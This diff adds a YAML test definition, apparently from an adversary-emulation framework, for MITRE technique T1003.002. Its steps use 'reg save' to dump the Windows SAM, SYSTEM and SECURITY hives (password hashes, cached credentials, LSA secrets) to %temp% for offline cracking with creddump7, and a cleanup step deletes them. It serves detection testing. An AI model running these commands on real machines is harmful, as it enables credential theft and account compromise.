@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Registry dump of SAM, creds, and secrets
+description: |
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
+    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
+    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
+uuid: 5c2571d0-1572-416d-9676-812e64ca9f44
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.002: Security Account Manager'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: registry-dump-of-sam,-creds,-and-secrets
+      inline: |
+        reg save HKLM\sam %temp%\sam
+        reg save HKLM\system %temp%\system
+        reg save HKLM\security %temp%\security
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del %temp%\sam >nul 2> nul
+            del %temp%\system >nul 2> nul
+            del %temp%\security >nul 2> nul
+        executor: command_prompt
